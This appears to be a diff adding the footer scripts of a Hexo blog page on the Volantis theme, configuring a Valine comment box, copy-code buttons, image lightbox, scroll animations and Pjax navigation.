+
+
+
+
+
+
+  
+  
+<script src="/js/valine.js"></script>
+
+
+<script>
+  var GUEST_INFO = ['nick', 'mail', 'link'];
+  var meta = 'nick,mail,link'.split(',').filter(function (item) {
+    return GUEST_INFO.indexOf(item) > -1
+  });
+  var REQUIRED_FIELDS = ['nick', 'mail', 'link'];
+  var requiredFields = 'nick,mail'.split(',').filter(function (item) {
+    return REQUIRED_FIELDS.indexOf(item) > -1
+  });
+
+  function emoji(path, idx, ext) {
+    return path + "/" + path + "-" + idx + "." + ext;
+  }
+
+  var emojiMaps = {};
+  for (var i = 1; i <= 54; i++) {
+    emojiMaps['tieba-' + i] = emoji('tieba', i, 'png');
+  }
+  for (var i = 1; i <= 101; i++) {
+    emojiMaps['qq-' + i] = emoji('qq', i, 'gif');
+  }
+  for (var i = 1; i <= 116; i++) {
+    emojiMaps['aru-' + i] = emoji('aru', i, 'gif');
+  }
+  for (var i = 1; i <= 125; i++) {
+    emojiMaps['twemoji-' + i] = emoji('twemoji', i, 'png');
+  }
+  for (var i = 1; i <= 4; i++) {
+    emojiMaps['weibo-' + i] = emoji('weibo', i, 'png');
+  }
+
+  function pjax_valine() {
+    let pageUrl = $.trim($('#pjax-comment-path').text()) === "none" ? 
+      decodeURI(window.location.pathname) : $.trim($('#pjax-comment-path').text());
+    let pagePlaceholder = $.trim($('#pjax-comment-placeholder').text()) === "none" ?
+      "快来评论吧~" : $.trim($('#pjax-comment-placeholder').text());
+
+    let ALLPATH = '';
+    if(ALLPATH != '') pageUrl = ALLPATH;
+
+    var valine = new Valine();
+    valine.init({
+      el: '#valine_container',
+      meta: meta,
+      placeholder: pagePlaceholder,
+      path: pageUrl,
+      appId: "or2NepulP8NGKXehq1IRSQTc-gzGzoHsz",
+      appKey: "lRlc11XLlqK4AeDJeNJxo17y",
+      pageSize: '10',
+      avatar: 'robohash',
+      lang: 'zh-cn',
+      visitor: 'true',
+      highlight: 'true',
+      mathJax: 'false',
+      enableQQ: 'true',
+      requiredFields: requiredFields,
+      emojiCDN: 'https://cdn.jsdelivr.net/gh/volantis-x/cdn-emoji/valine/',
+      emojiMaps: emojiMaps
+    })
+  }
+
+  $(function () {
+    pjax_valine();
+  });
+</script>
+
+
+
+
+<!-- darkmodejs -->
+
+
+<!-- 复制 -->
+
+  <script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
+<script>
+    var clipboard = new ClipboardJS('.btn-copy', {
+        target: function (trigger) {
+            return trigger.nextElementSibling
+        }
+    });
+    function wait(callback, seconds) {
+        var timelag = null;
+        timelag = window.setTimeout(callback, seconds)
+    }
+    function pjax_initCopyCode() {
+        var copyHtml = '';
+        copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
+        copyHtml += '<i class="fas fa-copy"></i><span>COPY</span>';
+        copyHtml += '</button>';
+        $(".highlight .code pre").before(copyHtml);
+        $(".article pre code").before(copyHtml);
+        clipboard.off('success').on('success', function (e) {
+            let $btn = $(e.trigger);
+            $btn.addClass('copied');
+            let $icon = $($btn.find('i'));
+            $icon.removeClass('fa-copy');
+            $icon.addClass('fa-check-circle');
+            let $span = $($btn.find('span'));
+            $span[0].innerText = 'COPIED';
+            wait(function () {
+                $icon.removeClass('fa-check-circle');
+                $icon.addClass('fa-copy');
+                $span[0].innerText = 'COPY'
+            }, 2000)
+        });
+        clipboard.off('error').on('error', function (e) {
+            e.clearSelection();
+            let $btn = $(e.trigger);
+            $btn.addClass('copy-failed');
+            let $icon = $($btn.find('i'));
+            $icon.removeClass('fa-copy');
+            $icon.addClass('fa-times-circle');
+            let $span = $($btn.find('span'));
+            $span[0].innerText = 'COPY FAILED';
+            wait(function () {
+                $icon.removeClass('fa-times-circle');
+                $icon.addClass('fa-copy');
+                $span[0].innerText = 'COPY'
+            }, 2000)
+        })
+    }
+    $(function () {
+        pjax_initCopyCode()
+    });
+</script>
+
+
+<!-- scrollreveal -->
+
+  <script src="https://cdn.jsdelivr.net/npm/scrollreveal@4.0.6/dist/scrollreveal.min.js"></script>
+  <script type="text/javascript">
+    function pjax_scrollrebeal() {
+      ScrollReveal().reveal('.l_main .reveal', {
+        distance: '32px',
+        duration: '800',
+        interval: '20',
+        scale: '1',
+        easing: 'ease-out'
+      });
+    }
+
+    $(function () {
+      pjax_scrollrebeal();
+    });
+  </script>
+
+<!-- ******************************** -->
+
+<!-- fancybox -->
+<script src="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>
+<script>
+  function pjax_fancybox() {
+    $(".article-entry").find("img").not('.inline').not('a img').each(function () { //渲染 fancybox
+      var element = document.createElement("a"); // a 标签
+      $(element).attr("class", "fancybox");
+      $(element).attr("pjax-fancybox", "");  // 过滤 pjax
+      $(element).attr("href", $(this).attr("src"));
+      if ($(this).attr("data-original")) {
+        $(element).attr("href", $(this).attr("data-original"));
+      }
+      $(element).attr("data-fancybox", "images");
+      var caption = "";   // 描述信息
+      if ($(this).attr('alt')) {  // 判断当前页面是否存在描述信息
+        $(element).attr('data-caption', $(this).attr('alt'));
+        caption = $(this).attr('alt');
+      }
+      var div = document.createElement("div");
+      $(div).addClass("fancybox");
+      $(this).wrap(div); // 最外层套 div ，其实主要作用还是 class 样式
+      var span = document.createElement("span");
+      $(span).addClass("image-caption");
+      $(span).text(caption); // 加描述
+      $(this).after(span);  // 再套一层描述
+      $(this).wrap(element);  // 最后套 a 标签
+    })
+    $(".article-entry").find("img").fancybox({
+      selector: '[data-fancybox="images"]',
+      hash: false,
+      loop: false,
+      closeClick: true,
+      helpers: {
+        overlay: {closeClick: true}
+      },
+      buttons: [
+        "zoom",
+        "close"
+      ]
+    });
+  };
+  $(function () {
+    pjax_fancybox();
+  });
+</script>
+
+<!-- ******************************** -->
+
+
+  
+<script src="/js/app.js"></script>
+
+
+
+
+  
+    
+<script src="/js/search.js"></script>
+
+  
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-busuanzi@2.3/js/busuanzi.pure.mini.js" data-pjax></script>
+
+
+
+  
+<script src="https://cdn.jsdelivr.net/npm/node-waves@0.7.6/dist/waves.min.js"></script>
+
+  <script type="text/javascript">
+    $(function () {
+      Waves.attach('.flat-btn', ['waves-button']);
+      Waves.attach('.float-btn', ['waves-button', 'waves-float']);
+      Waves.attach('.float-btn-light', ['waves-button', 'waves-float', 'waves-light']);
+      Waves.attach('.flat-box', ['waves-block']);
+      Waves.attach('.float-box', ['waves-block', 'waves-float']);
+      Waves.attach('.waves-image');
+      Waves.init();
+    });
+  </script>
+
+
+
+  
+<script src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@2/js/comment_typing.js"></script>
+
+
+
+
+
+
+
+    
+      
+
+
+<script src="https://cdn.jsdelivr.net/npm/pjax@0.2.8/pjax.min.js"></script>
+
+<!-- 样式位于：source/css/_third-party/pjaxanimate.styl -->
+
+<div class="pjax-animate">
+  
+    <script src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js"></script>
+    <div id="loading-bar-wrapper"><script>NProgress.configure({parent:"#loading-bar-wrapper",trickleSpeed: 100})</script></div>
+    <script>
+      window.ShowLoading = function() {
+        NProgress.start();
+      };
+      window.HideLoading = function() {
+        NProgress.done();
+      }
+    </script>
+  
+</div>
+
+<script>
+    var pjax;
+    document.addEventListener('DOMContentLoaded', function () {
+      pjax = new Pjax({
+        elements: 'a[href]:not([href^="#"]):not([href="javascript:void(0)"]):not([pjax-fancybox])',
+        selectors: [
+          "title",
+          "#pjax-container",
+          "#pjax-header-nav-list"
+        ],
+        cacheBust: false,   // url 地址追加时间戳，用以避免浏览器缓存
+        timeout: 5000
+      });
+    });
+
+    document.addEventListener('pjax:send', function (e) {
+      window.stop(); // 相当于点击了浏览器的停止按钮
+
+      try {
+        var currentUrl = window.location.pathname;
+        var targetUrl = e.triggerElement.href;
+        var banUrl = [""];
+        if (banUrl[0] != "") {
+          banUrl.forEach(item => {
+            if(currentUrl.indexOf(item) != -1 || targetUrl.indexOf(item) != -1) {
+              window.location.href = targetUrl;
+            }
+          });
+        }
+      } catch (error) {}
+
+      window.subData = null; // 移除标题（用于一二级导航栏切换处）
+      $.fancybox.close();    // 关闭弹窗
+      $('.l_header .switcher .s-search').removeClass('active'); // 关闭移动端激活的搜索框
+      $('.l_header').removeClass('z_search-open'); // 关闭移动端激活的搜索框
+      $('.wrapper').removeClass('sub'); // 跳转页面时关闭二级导航
+
+      // 解绑事件 避免重复监听
+      $('.s-top').unbind('click');
+      $('.menu a').unbind('click');
+      $(window).unbind('resize');
+      $(window).unbind('scroll');
+      $(document).unbind('scroll');
+      $(document).unbind('click');
+      $('body').unbind('click');
+      window.ShowLoading();
+    });
+
+    document.addEventListener('pjax:complete', function () {
+      // 关于百度统计对 SPA 页面的处理：
+      // 方案一：百度统计>管理>单页应用设置中，打开开启按钮即可对SPA进行统计。 https://tongji.baidu.com/web/help/article?id=324
+      // 方案二：取消注释下列代码。 https://tongji.baidu.com/web/help/article?id=235
+      // 
+
+      // 关于谷歌统计对 SPA 页面的处理：
+      // 当应用以动态方式加载内容并更新地址栏中的网址时，也应该更新通过 gtag.js 存储的网页网址。
+      // https://developers.google.cn/analytics/devguides/collection/gtagjs/single-page-applications?hl=zh-cn
+      
+
+      $('.nav-main').find('.list-v').not('.menu-phone').removeAttr("style",""); // 移除小尾巴的移除
+      $('.menu-phone.list-v').removeAttr("style",""); // 移除小尾巴的移除
+      $('script[data-pjax], .pjax-reload script').each(function () {
+        $(this).parent().append($(this).remove());
+      });
+
+      try{
+        pjax_fancybox();
+        
+          
+          if ('.cover') {
+            $('.cover').backstretch("resize");
+          } else {
+            $.backstretch("resize");
+          }
+        
+        
+        
+          pjax_scrollrebeal();
+        
+        
+          pjax_initCopyCode();
+        
+        
+          pjax_valine();
+        
+        
+        
+        
+        
+      } catch (e) {
+        console.log(e);
+      }
+      window.HideLoading();
+    });
+
+    document.addEventListener('pjax:error', function (e) {
+      window.HideLoading();
+      window.location.href = e.triggerElement.href;
+    });
+</script>
+
+    
+  </div>
+</body>
+</html>
